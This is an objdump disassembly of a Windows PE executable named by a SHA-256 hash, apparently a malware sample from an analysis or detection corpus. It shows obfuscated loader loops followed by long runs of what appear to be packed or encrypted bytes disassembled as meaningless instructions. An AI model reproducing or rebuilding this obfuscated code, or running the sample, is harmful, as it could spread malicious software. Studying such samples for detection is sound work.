
c03c2742ebc7befd86325b8647bdbb03ea05d3a00927759a72d9a8bb13ff316f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	(bad)  
  4012f4:	xlat   BYTE PTR ds:[ebx]
  4012f5:	push   cs
  4012f6:	pushf  
  4012f7:	jo     0x401369
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	scas   al,BYTE PTR es:[edi]
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	fdivr  st,st(7)
  4013a9:	xchg   esp,eax
  4013aa:	fisub  DWORD PTR [ebx+0x1a5f05d9]
  4013b0:	adc    BYTE PTR [esp+eax*2-0x16],cl
  4013b4:	jecxz  0x40134f
  4013b6:	jmp    0xb047:0x3e25438d
  4013bd:	loop   0x401402
  4013bf:	push   cs
  4013c0:	test   edx,edx
  4013c2:	repnz loopne 0x401375
  4013c5:	xor    ch,BYTE PTR [ecx]
  4013c7:	cmp    DWORD PTR [eax+0x46f2d4f3],0xffffffb6
  4013ce:	adc    BYTE PTR [ebx],dh
  4013d0:	mov    ebx,0x50cd02ec
  4013d5:	clc    
  4013d6:	adc    DWORD PTR [ebp+0x1a5c5151],0xffffffa2
  4013dd:	dec    edx
  4013de:	stos   BYTE PTR es:[edi],al
  4013df:	(bad)  
  4013e1:	fidivr DWORD PTR ds:0x90ab0fec
  4013e7:	fsub   QWORD PTR [edi-0x14eb6a72]
  4013ed:	or     esp,DWORD PTR [ebx-0x1fa2bedb]
  4013f3:	aas    
  4013f4:	adc    eax,0x89f29ce1
  4013f9:	iret   
  4013fa:	retf   0x5c74
  4013fd:	pop    es
  4013fe:	xor    esi,DWORD PTR [eax]
  401400:	gs mov edx,0xe0fa8cca
  401406:	je     0x401440
  401408:	in     eax,0xc1
  40140a:	mov    al,ds:0x907efd52
  40140f:	xchg   ebx,eax
  401410:	daa    
  401411:	shl    BYTE PTR [ebp-0x37a6359b],cl
  401417:	stos   BYTE PTR es:[edi],al
  401418:	test   al,0x89
  40141a:	imul   esp,DWORD PTR [ecx-0x77b59987],0x5f
  401421:	int    0x38
  401423:	inc    ecx
  401424:	inc    edx
  401425:	outs   dx,BYTE PTR ds:[esi]
  401426:	or     eax,0x5fa7348b
  40142b:	pop    edi
  40142c:	ins    BYTE PTR es:[edi],dx
  40142d:	xchg   BYTE PTR [eax-0x6],ah
  401430:	dec    eax
  401431:	jmp    0x4013d5
  401433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401435:	add    BYTE PTR [ebx+0x17de6b2e],0x58
  40143c:	icebp  
  40143d:	pop    esi
  40143e:	jo     0x40148a
  401440:	shr    esi,cl
  401442:	push   esp
  401443:	inc    ecx
  401444:	sbb    DWORD PTR [ebp+0x5],0x4e
  401448:	das    
  401449:	(bad)  
  40144a:	mov    ebx,0x9e4d82c1
  40144f:	xor    ax,0xa014
  401453:	cmp    al,0x64
  401455:	push   0x38a6164f
  40145a:	outs   dx,DWORD PTR ds:[esi]
  40145b:	dec    edi
  40145c:	sub    edx,DWORD PTR [edx+esi*1-0x5959297f]
  401463:	lock and DWORD PTR [edx-0x65c3bbe8],edx
  40146a:	jmp    0x4014de
  40146c:	imul   DWORD PTR [ebx]
  40146e:	aas    
  40146f:	icebp  
  401470:	pop    ebx
  401471:	(bad)  [esi-0xa13f866]
  401477:	hlt    
  401478:	inc    edi
  401479:	outs   dx,BYTE PTR ds:[esi]
  40147a:	mov    al,ds:0xed36f965
  40147f:	shl    BYTE PTR [eiz*8+0x6b8d5843],1
  401486:	clc    
  401487:	mov    DWORD PTR [ebx],esp
  401489:	out    0xf0,al
  40148b:	daa    
  40148c:	add    al,0x2e
  40148e:	sub    BYTE PTR [ebx-0x493de5c],dh
  401494:	mov    dl,0x4b
  401496:	mov    al,ds:0x28539b0e
  40149b:	cmc    
  40149c:	into   
  40149d:	lahf   
  40149e:	xchg   edx,eax
  40149f:	mov    eax,ds:0x5de779d4
  4014a4:	test   eax,0xb8ff89c8
  4014a9:	xor    esi,eax
  4014ab:	cli    
  4014ac:	mov    edx,0x63bb07a0
  4014b1:	jmp    0x401497
  4014b3:	push   0x78
  4014b5:	dec    edi
  4014b6:	sbb    al,0x3c
  4014b8:	adc    al,0xe8
  4014ba:	loop   0x40152e
  4014bc:	mov    eax,0xe5835cea
  4014c1:	imul   edx,DWORD PTR [ebx+0x14e94e56],0xffffffd0
  4014c8:	aaa    
  4014c9:	jns    0x40152e
  4014cb:	ins    DWORD PTR es:[edi],dx
  4014cc:	leavew 
  4014ce:	dec    ebx
  4014cf:	adc    BYTE PTR [edx],ah
  4014d1:	lods   eax,DWORD PTR ds:[esi]
  4014d2:	or     ecx,DWORD PTR [ebp+0x340131cd]
  4014d8:	pop    es
  4014d9:	or     ah,cl
  4014db:	ret    0xf92b
  4014de:	mov    eax,ds:0x3391c01a
  4014e3:	lahf   
  4014e4:	jge    0x401518
  4014e6:	lods   al,BYTE PTR ds:[esi]
  4014e7:	fisub  WORD PTR [edx-0x1bc870b3]
  4014ed:	fs xchg ebx,eax
  4014ef:	in     al,dx
  4014f0:	push   0x3085754b
  4014f5:	fwait
  4014f6:	cmp    ecx,DWORD PTR [ebp+0x5da66dc]
  4014fc:	push   edi
  4014fd:	out    0xbe,eax
  4014ff:	mov    WORD PTR [ebp-0x4],ax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x3a62e013]
  401516:	cmp    BYTE PTR [esi+0x70707e70],dh
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	mov    edx,0x837667e
  401525:	cli    
  401526:	ins    DWORD PTR es:[edi],dx
  401527:	sub    eax,0x45678ad7
  40152c:	(bad)  
  40152d:	jl     0x401557
  40152f:	adc    al,0x92
  401531:	in     eax,0x7e
  401533:	gs inc eax
  401536:	sbb    ch,BYTE PTR [edi+ebx*2+0x2b]
  40153a:	mov    al,ds:0x36926c9f
  40153f:	adc    ebx,DWORD PTR [edx-0x2956f9d5]
  401545:	test   eax,0x1a186996
  40154a:	test   BYTE PTR [ecx+0x344fe487],dh
  401550:	rcl    eax,cl
  401552:	cmc    
  401553:	daa    
  401554:	cmc    
  401555:	dec    DWORD PTR [ebx+0x29ca9981]
  40155b:	adc    DWORD PTR [edx+ebp*8-0x48],edx
  40155f:	sub    al,0x68
  401561:	dec    ebp
  401562:	mov    es,WORD PTR [eax+0x40]
  401565:	jb     0x40150b
  401567:	ins    DWORD PTR es:[edi],dx
  401568:	(bad)  
  401569:	retf   0xa510
  40156c:	shl    BYTE PTR [edx-0x4c],cl
  40156f:	fnstsw WORD PTR [edi-0x5e6ead4c]
  401575:	mov    esp,0xfa876a2a
  40157a:	adc    al,0x6e
  40157c:	iret   
  40157d:	sub    DWORD PTR [edx+0x2e7e7681],ebp
  401583:	sbb    BYTE PTR [ebp+0x56],dl
  401586:	push   ebx
  401587:	fcom   st(0)
  401589:	inc    esp
  40158a:	jle    0x4015d6
  40158c:	sub    BYTE PTR [ecx-0x3910adbf],al
  401592:	sbb    cl,BYTE PTR [ecx-0x47]
  401595:	sahf   
  401596:	sbb    al,0x5b
  401598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401599:	imul   edi,DWORD PTR [edx-0x80],0x11359849
  4015a0:	mov    gs,WORD PTR [esp+ebp*1]
  4015a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015a4:	jbe    0x401571
  4015a6:	jl     0x401623
  4015a8:	xchg   esp,eax
  4015a9:	imul   edx,DWORD PTR [edx],0x9
  4015ac:	fwait
  4015ad:	mov    ebx,0x62f4235b
  4015b2:	sbb    al,0x11
  4015b4:	pop    ecx
  4015b5:	dec    ebp
  4015b6:	adc    al,0xf
  4015b8:	jbe    0x401588
  4015ba:	add    DWORD PTR [eax+0x7bdcd761],esi
  4015c0:	cmc    
  4015c1:	jo     0x4015da
  4015c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015c4:	xchg   ebx,eax
  4015c5:	retf   
  4015c6:	mov    bl,0xc3
  4015c8:	fcom   QWORD PTR [edi+ebp*1+0x46484f36]
  4015cf:	cmp    al,0xb3
  4015d1:	mov    ah,0xe7
  4015d3:	pop    ds
  4015d4:	std    
  4015d5:	push   edi
  4015d6:	pusha  
  4015d7:	int3   
  4015d8:	rcl    DWORD PTR [eax+0x6b22c4cb],1
  4015de:	mov    eax,ds:0xf4d93126
  4015e3:	je     0x401614
  4015e5:	or     DWORD PTR [eax-0x57],eax
  4015e8:	sbb    eax,0x91b71eeb
  4015ed:	int3   
  4015ee:	hlt    
  4015ef:	or     ebp,DWORD PTR [eax]
  4015f1:	cdq    
  4015f2:	sub    ebx,DWORD PTR [esi+0x68]
  4015f5:	sti    
  4015f6:	test   al,ah
  4015f8:	jmp    0x6f537a61
  4015fd:	push   ss
  4015fe:	cmp    DWORD PTR [esi],edi
  401600:	dec    edx
  401601:	xor    al,0xbd
  401603:	lock ins DWORD PTR es:[edi],dx
  401605:	pop    eax
  401606:	sub    ah,al
  401608:	cdq    
  401609:	jmp    0xc0dcd918
  40160e:	outs   dx,DWORD PTR ds:[esi]
  40160f:	inc    edi
  401610:	cmp    BYTE PTR [ebx-0xc8d6097],0xbd
  401617:	pop    edx
  401618:	xor    DWORD PTR [esi-0x22],edi
  40161b:	xchg   edx,eax
  40161c:	(bad)  
  40161d:	outs   dx,DWORD PTR ds:[esi]
  40161e:	hlt    
  40161f:	push   ss
  401620:	aas    
  401621:	call   0x57d2:0x458279e3
  401628:	outs   dx,BYTE PTR ds:[esi]
  401629:	ins    BYTE PTR es:[edi],dx
  40162a:	mov    WORD PTR [eax+0x24],ds
  40162d:	out    0x61,al
  40162f:	test   BYTE PTR [edi-0x7c],ah
  401632:	inc    ebx
  401633:	mov    edi,eax
  401635:	or     eax,0xe78bfa2
  40163a:	fiadd  WORD PTR [edx]
  40163c:	inc    esi
  40163d:	mov    bh,0xe5
  40163f:	adc    eax,0x18545e44
  401644:	push   esp
  401645:	std    
  401646:	ins    DWORD PTR es:[edi],dx
  401647:	inc    sp
  401649:	pop    edx
  40164a:	lods   eax,DWORD PTR ds:[esi]
  40164b:	ret    
  40164c:	addr16 addr16 push es
  40164f:	(bad)  
  401650:	xchg   edx,eax
  401651:	and    eax,0x5f783e3f
  401656:	cs jbe 0x401643
  401659:	fidiv  DWORD PTR [esp+ebx*8-0x6c]
  40165d:	jmp    0x91e7:0xbc918199
  401664:	and    BYTE PTR [edx],ch
  401666:	add    al,0x60
  401668:	and    BYTE PTR [edi+0xa3d9b6c],al
  40166e:	std    
  40166f:	inc    ebx
  401670:	jl     0x40162e
  401672:	leave  
  401673:	fs pop ebp
  401675:	mov    ds:0x1034d89f,al
  40167a:	lds    ecx,FWORD PTR [edi+0x3]
  40167d:	sbb    esi,0x9161277e
  401683:	into   
  401684:	loop   0x4016a9
  401686:	push   edx
  401687:	call   0x4346:0xfd0768d0
  40168e:	dec    eax
  40168f:	sahf   
  401690:	and    BYTE PTR [edx-0x1c202b08],cl
  401696:	sar    ebp,0xd2
  401699:	dec    eax
  40169a:	xchg   esi,eax
  40169b:	xchg   esp,eax
  40169c:	sub    al,0x87
  40169e:	int3   
  40169f:	xchg   ecx,eax
  4016a0:	pop    ss
  4016a1:	daa    
  4016a2:	pop    ss
  4016a3:	bound  eax,QWORD PTR [eax-0x1c7edd81]
  4016a9:	ret    0x4093
  4016ac:	xlat   BYTE PTR ds:[ebx]
  4016ad:	mov    bl,0x49
  4016af:	(bad)  [ecx]
  4016b1:	xchg   ebx,eax
  4016b2:	sbb    esp,eax
  4016b4:	aas    
  4016b5:	stos   BYTE PTR es:[edi],al
  4016b6:	ret    0xadf9
  4016b9:	pusha  
  4016ba:	mov    fs,WORD PTR [ecx]
  4016bc:	or     BYTE PTR [ecx+0x68034630],ah
  4016c2:	shl    BYTE PTR [eax],0x8a
  4016c5:	or     al,0x77
  4016c7:	aad    0x90
  4016c9:	or     DWORD PTR [edx-0x2fd5e94e],ecx
  4016cf:	cli    
  4016d0:	pushf  
  4016d1:	in     al,0xfa
  4016d3:	push   0xffffffd6
  4016d5:	add    al,0x3e
  4016d7:	retw   
  4016d9:	add    al,0x14
  4016db:	xor    BYTE PTR [esi+0x326a1659],al
  4016e1:	xor    al,0xf5
  4016e3:	push   edx
  4016e4:	sbb    eax,0x8f9d576e
  4016e9:	data16 add al,0xfc
  4016ec:	lods   eax,DWORD PTR ds:[esi]
  4016ed:	sahf   
  4016ee:	xor    BYTE PTR [eax+0x2a],al
  4016f1:	or     ebp,DWORD PTR [ebx-0xea3a95d]
  4016f7:	iret   
  4016f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016f9:	add    DWORD PTR [ecx],0xffffffb0
  4016fc:	or     eax,0x8eb7769a
  401701:	mov    edx,0xd46e12dc
  401706:	cmp    eax,0x525565b1
  40170b:	xchg   ebp,eax
  40170c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40170e:	loope  0x401779
  401710:	mov    dl,0x9a
  401712:	cdq    
  401713:	loopne 0x4016c2
  401715:	repnz pop eax
  401717:	push   ss
  401718:	ins    DWORD PTR es:[edi],dx
  401719:	hlt    
  40171a:	bound  ecx,QWORD PTR [esi]
  40171c:	imul   ebx,DWORD PTR [ecx],0xffffff94
  40171f:	pop    ebx
  401720:	lea    eax,[ebp-0x30]
  401723:	mov    DWORD PTR [ebp-0x34],eax
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	pop    esi
  401741:	fdivr  QWORD PTR [eax+0x70]
  401744:	jo     0x4017c2
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	fcmovu st,st(4)
  40174e:	sti    
  40174f:	imul   esp,ebp,0xe4cbac5d
  401755:	adc    ecx,ebp
  401757:	xchg   esi,eax
  401758:	jbe    0x4017a7
  40175a:	xchg   esi,eax
  40175b:	mov    cl,0x8f
  40175d:	xor    esi,ebx
  40175f:	push   cs
  401760:	pop    ecx
  401761:	idiv   DWORD PTR [edi]
  401763:	adc    dl,bl
  401765:	aad    0x1a
  401767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401768:	fbld   TBYTE PTR [esi+ebx*1-0x49]
  40176c:	mov    ah,0xa
  40176e:	outs   dx,DWORD PTR ds:[esi]
  40176f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401770:	fdivr  QWORD PTR [esi]
  401772:	adc    al,0x75
  401774:	clc    
  401775:	adc    DWORD PTR [eax+0x7b],eax
  401778:	dec    esi
  401779:	mov    esp,0xc0776cc6
  40177e:	mov    eax,ds:0xc4eb2935
  401783:	inc    edi
  401784:	repz inc ebp
  401786:	in     al,0xb
  401788:	add    ch,BYTE PTR [ebp+0x34]
  40178b:	mov    gs,WORD PTR [esi-0x22b099e3]
  401791:	dec    esi
  401792:	cmc    
  401793:	(bad)  
  401794:	lods   al,BYTE PTR ds:[esi]
  401795:	frstor [ecx+0x34914ab7]
  40179b:	or     DWORD PTR [esp+edx*4+0x6d],eax
  40179f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017a0:	daa    
  4017a1:	call   0x6fca300a
  4017a6:	inc    BYTE PTR [edi-0x11]
  4017a9:	daa    
  4017aa:	(bad)  
  4017ac:	je     0x401773
  4017ae:	sbb    DWORD PTR [esi-0x52],esp
  4017b1:	xchg   esi,eax
  4017b2:	mov    ch,0x3f
  4017b4:	addr16 or al,0x16
  4017b7:	jge    0x401807
  4017b9:	add    eax,0xc920d273
  4017be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017bf:	and    dl,0x65
  4017c2:	xchg   edx,eax
  4017c3:	sbb    al,0x58
  4017c5:	pop    ebp
  4017c6:	dec    edx
  4017c7:	xor    eax,0x1a57ad56
  4017cc:	sbb    al,0xbe
  4017ce:	push   0x191e255e
  4017d3:	lock sti 
  4017d5:	fld    DWORD PTR ds:0xcfb378d2
  4017db:	aad    0x9e
  4017dd:	pusha  
  4017de:	sub    DWORD PTR [ebp+0x21dc9432],eax
  4017e4:	mov    gs,WORD PTR [ecx+0x2c]
  4017e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017e8:	cwde   
  4017e9:	aaa    
  4017ea:	aaa    
  4017eb:	jle    0x401830
  4017ed:	mov    ch,BYTE PTR [ecx+0x4f]
  4017f0:	mov    gs,WORD PTR [esi-0x3fbc2d31]
  4017f6:	rol    BYTE PTR [edi+0x73],1
  4017f9:	nop
  4017fa:	sbb    al,0xc2
  4017fc:	jns    0x4017f1
  4017fe:	mov    DWORD PTR [edx-0x6f],edi
  401801:	jae    0x401855
  401803:	jmp    0x547b:0x4be0c398
  40180a:	mov    DWORD PTR ds:0x1fe69c49,edi
  401810:	popa   
  401811:	stc    
  401812:	outs   dx,BYTE PTR ds:[esi]
  401813:	imul   edi,eax,0xe3b51a01
  401819:	es jp  0x401803
  40181c:	push   0xd0191565
  401821:	xchg   esp,eax
  401822:	stos   BYTE PTR es:[edi],al
  401823:	mov    dh,0x8f
  401825:	cmp    edi,DWORD PTR [eax-0x1e]
  401828:	stos   BYTE PTR es:[edi],al
  401829:	adc    esi,ebx
  40182b:	jb     0x40181c
  40182d:	lock xor al,0x7c
  401830:	mov    edi,edx
  401832:	xor    ah,0xca
  401835:	push   es
  401836:	or     edx,DWORD PTR [ecx+0x2e88beb0]
  40183c:	lahf   
  40183d:	test   BYTE PTR [edi+edx*2+0x2ef93619],ah
  401844:	and    ebp,DWORD PTR [ebx-0x593f9e4d]
  40184a:	sbb    edx,edx
  40184c:	jbe    0x40186f
  40184e:	pop    eax
  40184f:	push   0xffffffd8
  401851:	add    edi,ecx
  401853:	ins    DWORD PTR es:[edi],dx
  401854:	inc    ebp
  401855:	mov    al,ds:0x8b304954
  40185a:	ror    BYTE PTR [ebx],0xd1
  40185d:	xor    DWORD PTR [esi+esi*2-0x35],esi
  401861:	call   0x170f:0xb6bde37e
  401868:	and    DWORD PTR [ecx],edx
  40186a:	inc    esi
  40186b:	push   esp
  40186c:	or     ah,BYTE PTR [ebx+ebx*1+0xfac5853]
  401873:	std    
  401874:	addr16 aaa 
  401876:	pop    eax
  401877:	js     0x401857
  401879:	pop    ss
  40187a:	jne    0x40181f
  40187c:	test   DWORD PTR [ecx],eax
  40187e:	in     eax,0x99
  401880:	jno    0x4018eb
  401882:	pusha  
  401883:	jne    0x4018e4
  401885:	test   al,0x2b
  401887:	pop    es
  401888:	fistp  DWORD PTR [ecx]
  40188a:	mul    BYTE PTR [edi]
  40188c:	mul    al
  40188e:	stos   DWORD PTR es:[edi],eax
  40188f:	lds    esp,FWORD PTR [ebp+0x3a]
  401892:	sbb    esi,0x3c
  401895:	jbe    0x4018db
  401897:	xchg   edi,eax
  401898:	hlt    
  401899:	add    BYTE PTR [ebx+0xf],cl
  40189c:	jb     0x401859
  40189e:	test   al,dh
  4018a0:	or     cl,BYTE PTR [ecx]
  4018a2:	mov    bl,0xe7
  4018a4:	fcmovbe st,st(2)
  4018a6:	ins    BYTE PTR es:[edi],dx
  4018a7:	mov    dl,0xbb
  4018a9:	xor    edx,eax
  4018ab:	lods   eax,DWORD PTR ds:[esi]
  4018ac:	cli    
  4018ad:	sub    esp,DWORD PTR [ebp+0x79e554c2]
  4018b3:	adc    BYTE PTR [edx],0x3
  4018b6:	lock mov dl,0x5
  4018b9:	xor    bh,BYTE PTR [ebx]
  4018bb:	mov    ecx,0xd378f2cf
  4018c0:	into   
  4018c1:	jns    0x40189f
  4018c3:	rcl    cl,cl
  4018c5:	xchg   esp,eax
  4018c6:	imul   edx,ebp,0xffffffb8
  4018c9:	outs   dx,BYTE PTR ds:[esi]
  4018ca:	lea    esi,[eax-0x568be89]
  4018d0:	rcr    BYTE PTR [ecx],cl
  4018d2:	pop    eax
  4018d3:	inc    esp
  4018d4:	retf   
  4018d5:	mov    ds:0x70fd90c5,eax
  4018da:	dec    edi
  4018db:	test   eax,0x65760a01
  4018e0:	into   
  4018e1:	jecxz  0x4018eb
